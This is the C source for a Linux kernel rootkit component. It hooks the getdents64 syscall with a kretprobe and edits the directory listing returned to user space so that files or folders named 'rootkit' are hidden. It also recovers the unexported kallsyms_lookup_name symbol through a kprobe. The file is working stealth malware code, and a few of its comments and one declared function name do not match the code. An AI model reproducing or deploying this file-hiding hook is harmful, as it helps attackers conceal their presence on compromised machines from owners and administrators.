/*
    * This file contains code to hijack the return data of the syscall “__x64_sys_getdents64”.
    * This hijacking is done with kretprobes.
*/

#pragma once
#pragma message ("Compiling: "__FILE__)

#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/kprobes.h> 
#include <linux/dirent.h>

#define DIRENT_NAME "rootkit" /* Name of file or folder to hide */
#define pr_fmt(fmt) " %s: %s(): " fmt, KBUILD_MODNAME, __func__

static void getKallsymsLoojupName(void);
static int entry_getDens64(struct kretprobe_instance *ri, struct pt_regs *regs); /* Runs before the function it is hooked to */
static int getdents64Ret(struct kretprobe_instance *ri, struct pt_regs *regs); /* Runs before the function it is hooked to */
static void register_probe_dentry(void);
static void unregister_probe_dentry(void);


static struct kretprobe getdens64KretProbe = {};
/* per-instance private data */
struct my_data {
	void* user_pointer; /* Pointer to linux_dirent64 in the program user space */
};

/*
    ? struct dirent {
        *ino_t          d_ino;        // inode number 
        *off_t          d_off;        // offset to the next dirent 
        *unsigned short d_reclen;     // length of this record (total size of the struct in bytes)
        *unsigned char  d_type;       // type of file; not supported by all file system types 
        *char           d_name[256];  filename 
    ?   };
*/
static struct linux_dirent64 *previous_dir, *current_dir, *dirent_temp_kernel_buffer = NULL;

/* Declaration of type kallsyms_lookup_name_t (returns a pointer and receives as parameter a string) */
typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
/*
    *kallsyms_lookup_name_t is a function that the kernel no longer exports, 
    *which retrieves the memory addresses from a symbol, which the kernel exports in /proc/kallsyms 
*/  
static kallsyms_lookup_name_t kallsyms_lookup_name_kp = NULL;
/* Recover function with the help of kernel probes */
static void getKallsymsLookupName(void){
    /* Utiliza el parametro symbol_name (solo es capaz de proporcionar punteros a funciones que estan en la .text del kernel)
        la tabla de syscalls no esta en la .text, pero kallsyms_lookup_name si
    */
    static struct kprobe kp = {
        .symbol_name = "kallsyms_lookup_name"
    };

    register_kprobe(&kp);
	kallsyms_lookup_name_kp = (kallsyms_lookup_name_t) kp.addr; // Obtengo la direccion de kallsyms_lookup_name_t
	unregister_kprobe(&kp);

    pr_info("kalssyms_lookup_name: %px\n",kallsyms_lookup_name_kp);
    //pr_info("sock_def_readable: %px\n",kallsyms_lookup_name_kp("sock_def_readable"));
}


/* Runs before the function it is hooked to */
/*
    ? struct kretprobe_instance *ri -> Struct kretprobe_instance to get private data
    ? struct pt_regs *regs -> To get the cpu registers when calling the hooked function
    * return 1 skip handler (getdents64Ret) | return 0 executes handler (getdents64Ret)
*/
static int entry_getDens64(struct kretprobe_instance *ri, struct pt_regs *regs){

	struct my_data *data;
	if (!current->mm) /* Kernel threads have no memory descriptor struct (user space) */
		return 1;	/* Skip kernel threads */
	data = (struct my_data *)ri->data;

    /* Gets cpu registers on system call */
    struct pt_regs* user_regs = (struct pt_regs* ) regs->di; /* The pointer to the registers of the system call are in di (X86-64) */
    /* Linux use SYSTEM V ABI, the first parameter is passed in the register rdi */
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)user_regs->si; /* I take the pointer where the data is stored back (rdi register in X86_64) */
    data->user_pointer = dirent; /* Save the pointer in private data */
	return 0;
}
/* Runs after the function it is hooked to */
static int getdents64Ret(struct kretprobe_instance *ri, struct pt_regs *regs){

    struct my_data *data = (struct my_data *)ri->data;
    struct linux_dirent64 __user *dirent_userspace = (struct linux_dirent64 *)data->user_pointer; /* Recover the pointer */

    int retval = regs_return_value(regs); /* I get the cpu registers after the system call (buffer length)*/
    dirent_temp_kernel_buffer = kzalloc(retval, GFP_KERNEL); /* return buffer length */

    /* Check if there has been a failure */
    if ( (retval <= 0) || (dirent_temp_kernel_buffer == NULL) )
        return retval;

    /* Copy from the userspace buffer dirent, to our kernel buffer dirent_temp_kernel_buffer */
    int error;
    error = copy_from_user(dirent_temp_kernel_buffer, dirent_userspace, retval); /* Copies the actual data to be sent to user space to the temporary kernel buffer. */
    if(error){ /* With an error, I release the temporary buffer and return the real value of the real buffer length */
        //goto done;
        kfree(dirent_temp_kernel_buffer);
        return retval;
    }
        
     /* Loop over offset */
    unsigned long offset = 0;
    while (offset < retval)
    {
        /*
            * In the first iteration I set the current directory pointer to 0 (start of the buffer) 
            * In the other iterations I increase the offset to go through the buffer.
            * The size of the structure varies according to the length of the character string in the name
        */
        current_dir = (void *)dirent_temp_kernel_buffer + offset;

        /* Compare the bytes of DIRENT_NAME with the d_name values of current_dir*/
        if ( memcmp(DIRENT_NAME, current_dir->d_name, strlen(DIRENT_NAME)) == 0){
            #if verbose == 1
                pr_info("Found %s\n",current_dir->d_name);
            #endif
            
            /*
                * If the first element of the buffer matches the first element of the temporary buffer in the kernel.
                *Just decrement the value of the total length of the buffer that is sent to user space, 
                    * and move the entire buffer to the left, occupying the gap left by the first element.
            */
            if(current_dir == dirent_temp_kernel_buffer)
            {
                /* Decrement the value of the buffer size to be sent to user space by the size of the structure to be deleted */
                retval -= current_dir->d_reclen;
                /* Move the buffer to the left, skipping the same element to be deleted */
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, retval);
                continue; /* Skip the loop */
            }

            /*
                * If it matches and it is not the first item in the list
                * The total size of the struct (to be hidden) is added to the previous element of the list, 
                    * so that when the list is scrolled from user space 
                    * (remember that the list is scrolled by adding to an offset the size of each element 
                    * (the size of each element varies with the length of the string containing the name),
                    * the element of the list that coincides with the value to be hidden is “skipped”,
                    * because the size that the pointer increases is that of 2 elements (the element to hide and the previous element).
            */
            previous_dir->d_reclen += current_dir->d_reclen;
        }
        else{
            previous_dir = current_dir; /* Previous list item is equal to the current one and repeat the loop.*/
        }
        
        /*
            * Increase the offset with the current size of the current dir (which is the one I am comparing)
            * The size of the structure varies according to the length of the character string in the name 
        */
        offset += current_dir->d_reclen;
    }

    /* Copy the temporary buffer in the kernel to the user space */
    copy_to_user(dirent_userspace, dirent_temp_kernel_buffer, retval);
    kfree(dirent_temp_kernel_buffer);
    return retval;
}

static void register_probe_dentry(){
    getdens64KretProbe.kp.symbol_name = "__x64_sys_getdents64"; /* Syscall name to be hooked  */
    getdens64KretProbe.handler = getdents64Ret;
    getdens64KretProbe.entry_handler = entry_getDens64;
    getdens64KretProbe.maxactive = NR_CPUS; /* Number of CPUs */
    getdens64KretProbe.data_size = sizeof(struct my_data); /* Space for data structure */
    register_kretprobe(&getdens64KretProbe);
}

static void unregister_probe_dentry(){
    kfree(dirent_temp_kernel_buffer); /* Always make sure to free the buffer, getdents64 is not atomic. */
    unregister_kretprobe(&getdens64KretProbe);
}